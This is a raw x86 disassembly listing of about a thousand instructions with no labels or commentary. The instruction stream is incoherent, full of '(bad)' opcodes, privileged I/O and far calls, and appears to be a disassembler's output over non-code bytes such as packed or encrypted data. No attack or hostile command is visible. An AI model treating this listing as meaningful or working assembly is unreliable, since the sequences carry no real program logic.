  403fc9:	mov    esi,0xc7c73f13
  403fce:	(bad)  
  403fcf:	lods   al,BYTE PTR ds:[esi]
  403fd0:	iret   
  403fd1:	enter  0x1310,0xe3
  403fd5:	sbb    BYTE PTR [eax+0x5],bl
  403fd8:	outs   dx,BYTE PTR ds:[esi]
  403fd9:	(bad)  
  403fda:	stos   DWORD PTR es:[edi],eax
  403fdb:	adc    eax,0xa87c61bc
  403fe0:	push   esi
  403fe1:	xor    ch,BYTE PTR [edx-0x14]
  403fe4:	call   0xca182830
  403fe9:	push   ss
  403fea:	mov    ds:0x3c54cc35,eax
  403fef:	imul   esi,DWORD PTR [esi+eax*2+0x34],0xa
  403ff4:	xor    bh,BYTE PTR [edx-0x4c]
  403ff7:	pop    esp
  403ff8:	test   BYTE PTR [edx-0x2f],bh
  403ffb:	nop
  403ffc:	int    0x50
  403ffe:	mov    edi,0x97437236
  404003:	mov    ds:0x19ce682c,eax
  404008:	addr16 je 0x40407a
  40400b:	int3   
  40400c:	and    ch,0x8
  40400f:	int    0xc2
  404011:	sbb    DWORD PTR [ebx],esi
  404013:	cmp    dh,BYTE PTR [edx+eax*1]
  404016:	push   0xffffff81
  404018:	add    al,0x64
  40401a:	aam    0x4e
  40401c:	mov    bh,0x77
  40401e:	and    esi,ebp
  404020:	fsub   QWORD PTR [ebp+0x2d]
  404023:	jnp    0x404092
  404025:	popa   
  404026:	(bad)  
  404028:	fld    QWORD PTR [ebx+0xfe292da]
  40402e:	or     BYTE PTR ds:0x8f6466d7,ch
  404034:	push   ebx
  404035:	fucomip st,st(3)
  404037:	aad    0x7c
  404039:	push   0xffffffff
  40403b:	nop
  40403c:	mov    cl,0x8f
  40403e:	and    al,0x6f
  404040:	(bad)  
  404041:	out    dx,eax
  404042:	and    BYTE PTR [edx+ecx*8],dh
  404045:	cmp    ebx,DWORD PTR [edi+0x37]
  404048:	rcr    DWORD PTR [edx+ebx*2+0x0],1
  40404c:	mov    BYTE PTR [ecx+0x12],al
  40404f:	or     al,0x66
  404051:	ins    DWORD PTR es:[edi],dx
  404052:	and    eax,0xc798cc93
  404057:	or     ch,BYTE PTR [ebx+0x57]
  40405a:	rcr    BYTE PTR [ecx+0xc74a9a3],0xd3
  404061:	imul   edi,DWORD PTR ds:0x2c3ff56c,0xf9ec6de
  40406b:	mov    ebx,DWORD PTR [esi]
  40406d:	mov    dl,0x2f
  40406f:	add    DWORD PTR [edi+0x1a49ae92],ecx
  404075:	push   esi
  404076:	scas   eax,DWORD PTR es:[edi]
  404077:	or     edi,DWORD PTR [ebx-0x6df05f8a]
  40407d:	mov    cl,0x86
  40407f:	add    BYTE PTR [ecx+0x1b],bh
  404082:	stos   DWORD PTR es:[edi],eax
  404083:	add    al,0xc4
  404085:	xlat   BYTE PTR ds:[ebx]
  404086:	call   0x4172:0x6b58161f
  40408d:	es dec eax
  40408f:	sub    ch,al
  404091:	sub    bh,BYTE PTR [edx]
  404093:	jecxz  0x4040e1
  404095:	(bad)
  404098:	or     eax,0x6143c07a
  40409d:	in     al,dx
  40409e:	daa    
  40409f:	jne    0x404048
  4040a1:	imul   ecx,DWORD PTR [ebx+0x77],0xffffffc3
  4040a5:	mov    DWORD PTR [ebx-0x78d85f38],esp
  4040ab:	clc    
  4040ac:	scas   al,BYTE PTR es:[edi]
  4040ad:	push   es
  4040ae:	dec    edx
  4040af:	mov    eax,eax
  4040b1:	jne    0x404071
  4040b3:	xchg   esi,eax
  4040b4:	jge    0x40407d
  4040b6:	pop    edx
  4040b7:	push   0xffffff87
  4040b9:	jnp    0x404121
  4040bb:	or     al,0x7b
  4040bd:	mov    eax,0xa16de035
  4040c2:	inc    ecx
  4040c3:	pop    ecx
  4040c4:	cmp    eax,0x82e5e9fc
  4040c9:	push   esp
  4040ca:	mov    edx,0x96d2338b
  4040cf:	outs   dx,DWORD PTR ds:[esi]
  4040d0:	push   ecx
  4040d1:	fistp  WORD PTR [ebp-0x64]
  4040d4:	pop    edi
  4040d5:	cmp    eax,DWORD PTR [esi-0x3b]
  4040d8:	and    bh,BYTE PTR [edx]
  4040da:	jecxz  0x4040ce
  4040dc:	retf   0xd681
  4040df:	ret    
  4040e0:	add    eax,0x7a2da04
  4040e5:	adc    esi,DWORD PTR [ebp-0x46]
  4040e8:	je     0x404142
  4040ea:	cmp    eax,0x303307d4
  4040ef:	adc    eax,0x87f09b36
  4040f4:	rcr    ebp,1
  4040f6:	adc    edx,DWORD PTR [ebp-0x32]
  4040f9:	cld    
  4040fa:	call   0xc7e:0x5dcd7995
  404101:	cmp    BYTE PTR [edi-0x76],dh
  404104:	dec    esp
  404105:	or     al,0x36
  404107:	jnp    0x4040e3
  404109:	dec    eax
  40410a:	clc    
  40410b:	adc    eax,0x5345359f
  404110:	popf   
  404111:	gs mov edi,0xc23d43f6
  404117:	dec    eax
  404118:	in     al,dx
  404119:	pop    esp
  40411a:	pop    ss
  40411b:	sub    dl,BYTE PTR [edx+0x5d538872]
  404121:	popa   
  404122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404123:	jae    0x40419a
  404125:	pop    ss
  404126:	add    eax,0x85af56b9
  40412b:	scas   al,BYTE PTR es:[edi]
  40412c:	je     0x40418f
  40412e:	test   DWORD PTR [edi],ecx
  404130:	pop    es
  404131:	(bad)  
  404132:	retf   
  404133:	push   0x49662dbd
  404138:	sub    al,0xb6
  40413a:	hlt    
  40413b:	lods   eax,DWORD PTR ds:[esi]
  40413c:	xchg   DWORD PTR [eax-0x1f],ebp
  40413f:	fild   DWORD PTR [edi+0x2b]
  404142:	loope  0x4041a3
  404144:	iret   
  404145:	ret    
  404146:	xchg   edi,eax
  404147:	pop    ebp
  404148:	arpl   WORD PTR [eax+ebp*1],cx
  40414b:	push   ebx
  40414c:	outs   dx,DWORD PTR ds:[esi]
  40414d:	ds mov bl,0x76
  404150:	jg     0x4041a6
  404152:	out    dx,eax
  404153:	push   eax
  404154:	stos   BYTE PTR es:[edi],al
  404155:	or     eax,0xd80769b1
  40415a:	ror    BYTE PTR [ecx-0x5c06c241],cl
  404160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404161:	jg     0x40415e
  404163:	mov    ebp,0x49f135bd
  404168:	sbb    BYTE PTR [esi+0x2dfeda10],dl
  40416e:	lods   eax,DWORD PTR ds:[esi]
  40416f:	or     al,0x52
  404171:	retf   
  404172:	mov    ebp,0x3ccb2e4f
  404177:	push   edx
  404178:	add    eax,0xa94667a2
  40417d:	or     esp,esi
  40417f:	sti    
  404180:	aaa    
  404181:	in     eax,0xb2
  404183:	jmp    0xc5152033
  404188:	popa   
  404189:	pop    esp
  40418a:	mov    ds:0x1f88c803,eax
  40418f:	aam    0xca
  404191:	cmc    
  404192:	pop    ebp
  404193:	mov    BYTE PTR [ebp+ebx*8-0x1c32bd46],ch
  40419a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40419b:	mov    eax,0xd6cd91b7
  4041a0:	in     al,0x42
  4041a2:	xor    eax,0x2ab8bf87
  4041a7:	arpl   WORD PTR [eax-0x2b8c1e60],cx
  4041ad:	iret   
  4041ae:	ins    BYTE PTR es:[edi],dx
  4041af:	push   eax
  4041b0:	sbb    ecx,DWORD PTR [ebp+ebp*2-0x63]
  4041b4:	mov    DWORD PTR [ecx+0x4dd1250b],edx
  4041ba:	stos   DWORD PTR es:[edi],eax
  4041bb:	stc    
  4041bc:	imul   ecx,DWORD PTR [eax-0x4f2a1f8a],0x7c
  4041c3:	stc    
  4041c4:	push   edi
  4041c5:	cmp    BYTE PTR [esi],cl
  4041c7:	or     DWORD PTR [ebp-0x6d25daa5],esp
  4041cd:	add    esi,DWORD PTR [esp+ecx*1+0x59]
  4041d1:	jnp    0x4041a5
  4041d3:	xchg   esi,eax
  4041d4:	inc    ebp
  4041d5:	add    BYTE PTR [ebx-0x4a],0x36
  4041d9:	pop    edi
  4041da:	xchg   edi,eax
  4041db:	jns    0x404233
  4041dd:	mov    ebp,0xd28a152e
  4041e2:	test   DWORD PTR [edx-0x75333e14],ebx
  4041e8:	mov    bh,0xb5
  4041ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041eb:	dec    esp
  4041ec:	push   esp
  4041ed:	rcr    DWORD PTR [eax],cl
  4041ef:	pop    ds
  4041f0:	ins    DWORD PTR es:[edi],dx
  4041f1:	scas   al,BYTE PTR es:[edi]
  4041f2:	mov    ss,esp
  4041f4:	popf   
  4041f5:	or     eax,0x7cff60e3
  4041fa:	pop    eax
  4041fb:	hlt    
  4041fc:	inc    esp
  4041fd:	aas    
  4041fe:	push   edx
  4041ff:	xlat   BYTE PTR ds:[ebx]
  404200:	arpl   WORD PTR [ebp-0x7ea75533],si
  404206:	ins    DWORD PTR es:[edi],dx
  404207:	cdq    
  404208:	rcl    BYTE PTR ds:0x6572a3f4,0x9d
  40420f:	pushf  
  404210:	loop   0x4041c0
  404212:	pushf  
  404213:	ins    DWORD PTR es:[edi],dx
  404214:	ins    BYTE PTR es:[edi],dx
  404215:	repnz inc esp
  404217:	push   edi
  404218:	mov    al,0x1c
  40421a:	iret   
  40421b:	jl     0x404279
  40421d:	sbb    ah,BYTE PTR [ebx-0x5189e5ba]
  404223:	mov    ds:0xdb8d8206,al
  404228:	mov    ecx,0x87902cf5
  40422d:	xor    ecx,DWORD PTR [edx-0x47]
  404230:	xchg   esp,eax
  404231:	imul   edi,DWORD PTR [ecx],0xffffffc4
  404234:	mov    edi,0xde35a305
  404239:	sbb    eax,0x66214ee8
  40423e:	and    edi,DWORD PTR [ecx-0x31]
  404241:	add    al,dl
  404243:	adc    ebp,DWORD PTR [edi-0x562ad9fd]
  404249:	or     esi,DWORD PTR [edx-0x65]
  40424c:	add    al,0xb4
  40424e:	cmp    ch,BYTE PTR [edi-0x3a025f38]
  404254:	mov    ch,0x93
  404256:	adc    DWORD PTR [ecx+0x54f99717],0xffffffd9
  40425d:	(bad)  
  40425e:	repnz xchg edi,eax
  404260:	les    edi,FWORD PTR [ebx-0x2e15b032]
  404266:	add    dl,dh
  404268:	shl    cl,cl
  40426a:	test   BYTE PTR [edx],ah
  40426c:	xor    BYTE PTR [ebx-0x7ceaefdb],bl
  404272:	xchg   DWORD PTR [esi],edi
  404274:	retf   
  404275:	mov    al,0xfe
  404277:	out    0xf5,eax
  404279:	add    edi,ebp
  40427b:	mov    cl,0xd
  40427d:	push   eax
  40427e:	fimul  WORD PTR [edi+eiz*4-0x19]
  404282:	shl    BYTE PTR [esi-0x54],cl
  404285:	pmullw mm6,QWORD PTR [edi*8+0x6442ac6]
  40428d:	bound  eax,QWORD PTR [edi+0x5a]
  404290:	scas   al,BYTE PTR es:[edi]
  404291:	clc    
  404292:	sbb    DWORD PTR [eax+0x3e0b7c09],eax
  404298:	data16 je 0x4042b4
  40429b:	popf   
  40429c:	dec    edx
  40429d:	pop    ds
  40429e:	stos   DWORD PTR es:[edi],eax
  40429f:	inc    ebx
  4042a0:	or     esi,DWORD PTR [ebp+edx*2-0x7e]
  4042a4:	mov    eax,0xbd92b01e
  4042a9:	mov    al,ds:0xce222d8b
  4042ae:	sub    ebp,DWORD PTR [ebx+0x12aa4415]
  4042b4:	scas   eax,DWORD PTR es:[edi]
  4042b5:	gs xor eax,ecx
  4042b8:	aaa    
  4042b9:	fxch   st(1)
  4042bb:	aam    0x7f
  4042bd:	add    DWORD PTR [ebx],esi
  4042bf:	add    BYTE PTR [ebx],ah
  4042c1:	push   ebx
  4042c2:	(bad)
  4042c6:	scas   eax,DWORD PTR es:[edi]
  4042c7:	dec    edi
  4042c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042c9:	pop    es
  4042ca:	xchg   BYTE PTR [edx],ch
  4042cc:	dec    esi
  4042cd:	jb     0x4042dd
  4042cf:	sub    eax,0x99dd99c0
  4042d4:	(bad)  
  4042d5:	clc    
  4042d6:	js     0x40434f
  4042d8:	sti    
  4042d9:	scas   al,BYTE PTR es:[edi]
  4042da:	js     0x4042af
  4042dc:	shl    ch,0x18
  4042df:	shl    BYTE PTR [esi-0x39],cl
  4042e2:	pop    esi
  4042e3:	push   edi
  4042e4:	mov    bh,0xa4
  4042e6:	mov    cs,edx
  4042e8:	pop    ebp
  4042e9:	imul   ebx,DWORD PTR [eax],0x7
  4042ec:	sbb    BYTE PTR [ecx],ah
  4042ee:	(bad)  
  4042ef:	sbb    bl,BYTE PTR [ebx]
  4042f1:	fst    QWORD PTR [eax-0x73]
  4042f4:	inc    ecx
  4042f5:	icebp  
  4042f6:	fsubr  QWORD PTR [edx+edi*1]
  4042f9:	or     DWORD PTR [ecx-0x70],ebp
  4042fc:	mov    esp,0xd874f830
  404301:	mov    ds:0xec4f96d,al
  404306:	sbb    al,0x94
  404308:	fwait
  404309:	sbb    eax,0x8fce5d9f
  40430e:	pop    eax
  40430f:	in     al,dx
  404310:	sbb    esp,DWORD PTR [ecx+ebx*4+0x6127eb6b]
  404317:	fld    DWORD PTR [esp+esi*4+0x50ea7811]
  40431e:	shr    BYTE PTR ds:0x7bc34684,cl
  404324:	xor    esi,DWORD PTR [ebx-0x1a]
  404327:	bnd ret 0x70ca
  40432b:	lahf   
  40432c:	fiadd  DWORD PTR [edx]
  40432e:	cmp    BYTE PTR [edi-0x49],dl
  404331:	dec    esp
  404332:	in     al,dx
  404333:	shl    BYTE PTR [eax-0x4095fcda],1
  404339:	lahf   
  40433a:	or     cl,BYTE PTR [esp+esi*8-0x57]
  40433e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40433f:	sbb    DWORD PTR [esi],ebx
  404341:	mov    esi,0x946c3748
  404346:	popf   
  404347:	sti    
  404348:	cmp    dh,cl
  40434a:	out    0xa3,al
  40434c:	loop   0x40437b
  40434e:	sub    DWORD PTR [edx-0x6002072a],ecx
  404354:	(bad)  
  404356:	and    esp,DWORD PTR [esi-0x3a]
  404359:	xchg   ebp,eax
  40435a:	or     al,0xed
  40435c:	mov    dl,0x13
  40435e:	xchg   edx,eax
  40435f:	xor    ebp,DWORD PTR [edi]
  404361:	pcmpeqw mm4,QWORD PTR [edi-0x6f49fc3c]
  404368:	dec    ecx
  404369:	test   al,0x9d
  40436b:	or     ah,dl
  40436d:	mov    ds:0xce40a8da,eax
  404372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404373:	scas   eax,DWORD PTR es:[edi]
  404374:	dec    ebp
  404375:	cmp    al,0x4b
  404377:	cmp    eax,0x31748ab6
  40437c:	cmp    cl,BYTE PTR [edx]
  40437e:	xchg   esi,eax
  40437f:	nop
  404380:	hlt    
  404381:	mov    edi,0x9f56275d
  404386:	add    al,0xf0
  404388:	jl     0x40437b
  40438a:	sbb    ecx,DWORD PTR [edi]
  40438c:	pushf  
  40438d:	inc    esi
  40438e:	cmp    esi,ebp
  404390:	dec    ebx
  404391:	mov    ds:0x93f70ceb,eax
  404396:	mov    eax,ds:0xd72fd57a
  40439b:	and    eax,0x297a6c2e
  4043a0:	das    
  4043a1:	adc    al,0xc4
  4043a3:	arpl   WORD PTR [ebp+0x6a],cx
  4043a6:	mov    bl,BYTE PTR [edi]
  4043a8:	out    dx,al
  4043a9:	cmp    cl,0x97
  4043ac:	push   ecx
  4043ad:	mov    ah,0x50
  4043af:	mov    ch,0x2
  4043b1:	rol    bh,0x6f
  4043b4:	pop    edi
  4043b5:	retf   0xd08
  4043b8:	add    esp,eax
  4043ba:	cdq    
  4043bb:	pop    ds
  4043bc:	mov    esp,0xfde25115
  4043c1:	loope  0x4043c5
  4043c3:	icebp  
  4043c4:	jecxz  0x404381
  4043c6:	(bad)  
  4043c7:	xchg   ecx,eax
  4043c8:	xchg   DWORD PTR [ecx-0x3fd8a066],ebx
  4043ce:	retf   0xf709
  4043d1:	xor    eax,0x577c7af7
  4043d6:	pop    es
  4043d7:	push   ecx
  4043d8:	mov    ch,bl
  4043da:	jne    0x40445b
  4043dc:	xor    ebp,ecx
  4043de:	iret   
  4043df:	ror    DWORD PTR [edi],cl
  4043e1:	fbstp  TBYTE PTR [ebp+0x2d]
  4043e4:	ret    0x499d
  4043e7:	push   edx
  4043e8:	and    DWORD PTR [edx+eiz*8+0x6cfb32db],edi
  4043ef:	ret    0x9892
  4043f2:	sub    BYTE PTR [ecx],dl
  4043f4:	mov    es:0x2c33abbb,al
  4043fa:	(bad)  
  4043fb:	int    0xf5
  4043fd:	shl    BYTE PTR ds:0x3779de97,0xd0
  404404:	and    eax,0x1087fb55
  404409:	jns    0x40442a
  40440b:	scas   al,BYTE PTR es:[edi]
  40440c:	mov    ebp,DWORD PTR ds:[edi-0x187f6d2e]
  404413:	cmp    edi,DWORD PTR [edi+0x10967ac2]
  404419:	push   cs
  40441a:	cmp    al,0x79
  40441c:	js     0x404431
  40441e:	push   es
  40441f:	xchg   ecx,eax
  404420:	fcom   QWORD PTR ds:0xb4e91f06
  404426:	in     eax,0xa7
  404428:	sbb    DWORD PTR [esi],ebx
  40442a:	add    al,0x1b
  40442d:	mov    ah,0xdc
  40442f:	out    dx,al
  404430:	and    dl,BYTE PTR [edx-0x1e]
  404433:	ret    
  404434:	inc    esi
  404435:	sbb    eax,0xcb9ae61f
  40443a:	jb     0x4043f8
  40443c:	pop    ebx
  40443d:	or     edx,DWORD PTR [edi]
  40443f:	(bad)  
  404441:	cwde   
  404442:	lds    esp,FWORD PTR ds:0x7ced0a97
  404448:	push   edx
  404449:	and    bh,BYTE PTR [esi]
  40444b:	test   BYTE PTR [edx+edi*8+0x7a],cl
  40444f:	adc    dl,BYTE PTR [esi+eax*2]
  404452:	sbb    al,0xf0
  404454:	imul   ecx,esi,0x7dead2cc
  40445a:	stc    
  40445b:	mov    eax,ds:0x4e8c03c0
  404460:	pop    ecx
  404461:	jne    0x404434
  404463:	sub    ebp,DWORD PTR [ebp-0x47]
  404466:	inc    edx
  404467:	push   esi
  404468:	loope  0x40449d
  40446a:	or     DWORD PTR [eax+esi*4-0x2b285911],ecx
  404471:	test   DWORD PTR [eax+eax*1],0x1ac98bc9
  404478:	xchg   DWORD PTR [edi-0x359504b1],ebp
  40447e:	leave  
  40447f:	adc    BYTE PTR [edi+0x1e],bl
  404482:	pop    esi
  404483:	in     eax,dx
  404484:	mov    edx,0x73cd7919
  404489:	mov    bl,0x82
  40448b:	pop    ecx
  40448c:	jae    0x40445a
  40448e:	or     DWORD PTR [edi],eax
  404490:	scas   al,BYTE PTR es:[edi]
  404491:	jns    0x4044d0
  404493:	test   eax,0xecd2591
  404498:	fisttp WORD PTR [ecx+0x14e31cab]
  40449e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40449f:	dec    esi
  4044a0:	xchg   bh,al
  4044a2:	daa    
  4044a3:	mov    bh,0x82
  4044a5:	iret   
  4044a6:	leave  
  4044a7:	push   edi
  4044a8:	cli    
  4044a9:	scas   eax,DWORD PTR es:[edi]
  4044aa:	loopne 0x4044af
  4044ac:	sahf   
  4044ad:	mov    ebp,0xfe59ecf0
  4044b2:	mov    ds:0xe30c3e3e,al
  4044b7:	fcomp  DWORD PTR ds:0xbaa680b2
  4044bd:	es pushw ss
  4044c0:	fcom   DWORD PTR [eax+0x66]
  4044c3:	inc    esp
  4044c4:	mov    ebp,0x68a75f42
  4044c9:	pushf  
  4044ca:	shr    esp,cl
  4044cc:	pop    ds
  4044cd:	inc    edx
  4044ce:	cmp    DWORD PTR es:[edx-0x7a],ecx
  4044d2:	aad    0x73
  4044d4:	test   eax,0x4a1b3a58
  4044d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044da:	jge    0x404505
  4044dc:	pusha  
  4044dd:	push   ss
  4044de:	sbb    BYTE PTR [esi+0x1],dl
  4044e1:	out    0x6a,eax
  4044e3:	outs   dx,DWORD PTR ds:[esi]
  4044e4:	rol    eax,1
  4044e6:	in     al,0x25
  4044e8:	cmp    al,0xe3
  4044ea:	mul    cl
  4044ec:	(bad)  
  4044ed:	(bad)  
  4044ee:	fidivr WORD PTR [ecx-0x62ef3e97]
  4044f4:	test   al,0xde
  4044f6:	loope  0x40450d
  4044f8:	sbb    bl,BYTE PTR [eax+0x73fb04c]
  4044fe:	pop    es
  4044ff:	sub    BYTE PTR [ebp-0x12],ah
  404502:	mov    ds:0x8cf26ca1,eax
  404507:	hlt    
  404508:	sbb    eax,DWORD PTR [edx]
  40450a:	mov    bh,0xa
  40450c:	jmp    0x404522
  40450e:	cmp    bl,BYTE PTR [ebx+0x5]
  404511:	push   es
  404512:	fimul  WORD PTR [edx-0x62f46445]
  404518:	inc    esp
  404519:	and    BYTE PTR [eax+0xd],0x61
  40451d:	sbb    DWORD PTR [ebx],ecx
  40451f:	rcl    BYTE PTR [ebp+0x2da374fe],0x4c
  404526:	push   edx
  404527:	xchg   ebx,eax
  404528:	add    al,0x37
  40452a:	in     al,dx
  40452b:	or     DWORD PTR [eax],0x3a
  40452e:	jb     0x4044ca
  404530:	and    edx,esp
  404532:	ret    0xfeb0
  404535:	ror    DWORD PTR [esi],cl
  404537:	push   ds
  404538:	fidivr WORD PTR [esi]
  40453a:	mov    bl,ch
  40453c:	repz xchg ecx,eax
  40453e:	(bad)  
  40453f:	mov    edx,0xadc4e94a
  404544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404545:	idiv   ch
  404547:	lock xchg ebp,eax
  404549:	cli    
  40454a:	pop    eax
  40454b:	mov    bl,0x9d
  40454d:	cmp    ebx,0x11426c64
  404553:	shr    BYTE PTR [eax-0x66830b0d],cl
  404559:	fadd   st,st(3)
  40455b:	push   edx
  40455c:	or     bl,bl
  40455e:	cmp    al,0x1
  404560:	push   ebp
  404561:	sub    eax,0x9f0e6848
  404566:	test   al,0xe1
  404568:	pop    ss
  404569:	clc    
  40456a:	addr16 pop ds
  40456c:	jae    0x40455d
  40456e:	mov    ecx,ebp
  404570:	add    DWORD PTR [ecx-0x6a84ae9],0x3cf3658a
  40457a:	inc    sp
  40457c:	imul   ecx,DWORD PTR [esp+eax*8+0x48ebd95a],0x31881070
  404587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404588:	add    ebp,esi
  40458a:	in     al,0x51
  40458c:	adc    dl,BYTE PTR [esi-0xc]
  40458f:	(bad)  
  404590:	test   eax,0x5d520ca
  404595:	inc    esp
  404596:	lods   al,BYTE PTR ds:[esi]
  404597:	mov    cl,0x73
  404599:	cdq    
  40459a:	stos   DWORD PTR es:[edi],eax
  40459b:	sub    al,0x86
  40459d:	xchg   edi,eax
  40459e:	shl    DWORD PTR [eax-0x658e558e],1
  4045a4:	dec    ebx
  4045a5:	test   al,0x1f
  4045a7:	enter  0xe12f,0xd8
  4045ab:	push   ss
  4045ac:	lods   al,BYTE PTR ds:[esi]
  4045ad:	jbe    0x40458c
  4045af:	push   edx
  4045b0:	dec    edx
  4045b1:	and    BYTE PTR [edx+0x23a74ad5],ah
  4045b7:	pop    edx
  4045b8:	push   ebp
  4045b9:	adc    edx,eax
  4045bb:	div    dh
  4045bd:	pop    ebx
  4045be:	inc    ebx
  4045bf:	jecxz  0x404571
  4045c1:	mov    dh,0x59
  4045c3:	mov    BYTE PTR [eax+0x5e5478a1],ah
  4045c9:	add    DWORD PTR [ecx+0xc],eax
  4045cc:	shl    esi,cl
  4045ce:	and    DWORD PTR [ebp-0x76],edi
  4045d1:	outs   dx,BYTE PTR ds:[esi]
  4045d2:	or     ah,0xf0
  4045d5:	ss sbb ebx,edx
  4045d8:	dec    esp
  4045d9:	sbb    eax,DWORD PTR [edx]
  4045db:	xchg   ebx,eax
  4045dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045dd:	add    BYTE PTR [esi+eax*4],dl
  4045e0:	lea    ecx,[ebp+0x13]
  4045e3:	loopne 0x40463a
  4045e5:	test   eax,0x213bc061
  4045ea:	sbb    ebx,edi
  4045ec:	mov    fs,esi
  4045ee:	mov    edi,DWORD PTR [edi+0x76]
  4045f1:	iret   
  4045f2:	(bad)  
  4045f3:	mov    ebx,0x476e4bf5
  4045f8:	repz inc eax
  4045fa:	mov    esi,0x4f14528a
  4045ff:	loop   0x404660
  404601:	enter  0x4d02,0xd1
  404605:	dec    edi
  404606:	xor    DWORD PTR [edi],0x1cac9733
  40460c:	repz jae 0x404623
  40460f:	test   al,0x9b
  404611:	mov    bh,0xdb
  404613:	xor    cl,BYTE PTR [eax+0xca711c0]
  404619:	mov    cl,0x25
  40461b:	inc    ebx
  40461c:	jno    0x404655
  40461e:	jne    0x4045bd
  404620:	and    al,0x53
  404622:	or     eax,0xbb120401
  404627:	ficom  DWORD PTR [edi]
  404629:	sbb    bl,cl
  40462b:	mov    ds:0x92cc20f3,al
  404630:	mov    eax,ds
  404632:	pop    ebp
  404633:	fist   DWORD PTR ds:0xfd2641e5
  404639:	push   ss
  40463a:	jp     0x404686
  40463c:	aad    0x54
  40463e:	(bad)  
  404640:	jae    0x4045e8
  404642:	adc    BYTE PTR [esp+ecx*8+0x76],ch
  404646:	sbb    BYTE PTR [ecx],cl
  404648:	mov    cl,0x75
  40464a:	inc    esi
  40464b:	fwait
  40464c:	and    DWORD PTR ds:0x5b55d339,esp
  404652:	loopne 0x404638
  404654:	inc    ecx
  404655:	adc    al,cl
  404657:	dec    eax
  404658:	out    dx,eax
  404659:	ins    DWORD PTR es:[edi],dx
  40465a:	push   ebp
  40465b:	ins    DWORD PTR es:[edi],dx
  40465c:	cmp    eax,0x400a6d99
  404661:	and    DWORD PTR [ebx],ecx
  404663:	pop    ss
  404664:	jb     0x404602
  404666:	pop    edi
  404667:	int3   
  404668:	mov    ds:0xe422cfcf,al
  40466d:	in     eax,0x10
  40466f:	js     0x4046ed
  404671:	xchg   esi,eax
  404672:	or     DWORD PTR [eax-0xf],esp
  404675:	loope  0x404633
  404677:	push   0xd7f03337
  40467c:	lahf   
  40467d:	cmp    dh,0xd1
  404680:	lock mov bl,0x45
  404683:	pop    eax
  404684:	aaa    
  404685:	stc    
  404686:	mov    bh,BYTE PTR [eax+0x106fa4ff]
  40468c:	inc    esi
  40468d:	fsubrp st(3),st
  40468f:	in     al,0x3c
  404691:	mov    bh,0x4e
  404693:	call   0x63377f2d
  404698:	adc    DWORD PTR [ebp+0x559c91d6],edi
  40469e:	inc    ebx
  40469f:	icebp  
  4046a0:	adc    edx,DWORD PTR [ecx]
  4046a2:	retf   0x61df
  4046a5:	ss test al,0xd0
  4046a8:	mov    esp,0xb7014a5c
  4046ad:	sbb    al,0x53
  4046af:	clc    
  4046b0:	addr16 jge 0x404652
  4046b3:	ss aad 0x55
  4046b6:	jge    0x40463f
  4046b8:	add    ecx,DWORD PTR [ecx-0x39f7d1f2]
  4046be:	jnp    0x4046e7
  4046c0:	ins    DWORD PTR es:[edi],dx
  4046c1:	and    al,0x38
  4046c3:	addr16 push 0x3
  4046c6:	test   BYTE PTR [edi+ecx*8],al
  4046c9:	retf   
  4046ca:	inc    ebx
  4046cb:	test   ebx,0xe1704b3b
  4046d1:	sbb    ah,ch
  4046d3:	into   
  4046d4:	inc    edi
  4046d5:	dec    edx
  4046d6:	push   edx
  4046d7:	icebp  
  4046d8:	pop    ecx
  4046d9:	aad    0x2d
  4046db:	sti    
  4046dc:	jns    0x40470e
  4046de:	idiv   BYTE PTR [ebx]
  4046e0:	add    ebp,DWORD PTR [edx]
  4046e2:	into   
  4046e3:	mov    ebp,0x282b41f0
  4046e8:	dec    esp
  4046e9:	jo     0x4046f6
  4046eb:	jo     0x4046d3
  4046ed:	sbb    eax,0x62d38701
  4046f2:	int    0xe2
  4046f4:	in     al,0x64
  4046f6:	or     al,0xa
  4046f8:	jno    0x4046cd
  4046fa:	pop    ebx
  4046fb:	add    BYTE PTR [edx],0xb
  4046fe:	cmp    ch,dl
  404700:	gs push ds
  404702:	push   ecx
  404703:	jp     0x404759
  404705:	jmp    0x404723
  404707:	push   ebp
  404708:	je     0x404774
  40470a:	popf   
  40470b:	(bad)  
  40470c:	int3   
  40470d:	mov    ?,WORD PTR [ebx]
  40470f:	xchg   edi,eax
  404710:	xlat   BYTE PTR ds:[ebx]
  404711:	push   ds
  404712:	jbe    0x4046e2
  404714:	lock loopne 0x40470a
  404717:	sbb    ebp,DWORD PTR [ebx-0x68607875]
  40471d:	mov    cl,dh
  40471f:	pop    ss
  404720:	cmp    eax,0xe3c7a001
  404725:	xor    DWORD PTR [eax],esi
  404727:	mov    ebx,0xa217054c
  40472c:	in     al,0x96
  40472e:	rcr    BYTE PTR [esi-0x3d5a4bc1],cl
  404734:	fs adc eax,0x1a59ee3e
  40473a:	push   ecx
  40473b:	mov    ecx,0x322d66b9
  404740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404741:	das    
  404742:	repz pop esp
  404744:	popa   
  404745:	pop    esi
  404746:	bound  edi,QWORD PTR [eax-0x6343347d]
  40474c:	inc    eax
  40474d:	mov    esi,0x693bd852
  404752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404753:	rol    BYTE PTR [edx-0x56fa6639],1
  404759:	cmc    
  40475a:	dec    ebx
  40475b:	cmc    
  40475c:	mov    ebp,0x8470cb36
  404761:	call   0x5d78:0x67bfad3f
  404768:	lds    edx,FWORD PTR [ecx+eax*4+0xc57240e]
  40476f:	adc    eax,0xefba490d
  404774:	jns    0x404784
  404776:	outs   dx,DWORD PTR ds:[esi]
  404777:	test   BYTE PTR [ebx+0x638edc3],bl
  40477d:	lock ja 0x40478f
  404780:	jno    0x4047af
  404782:	mov    eax,0x15d0a172
  404787:	inc    ebp
  404788:	pop    esp
  404789:	sbb    al,0xe5
  40478b:	xchg   BYTE PTR [ecx+esi*8+0x74bd7fe2],ah
  404792:	aad    0x8e
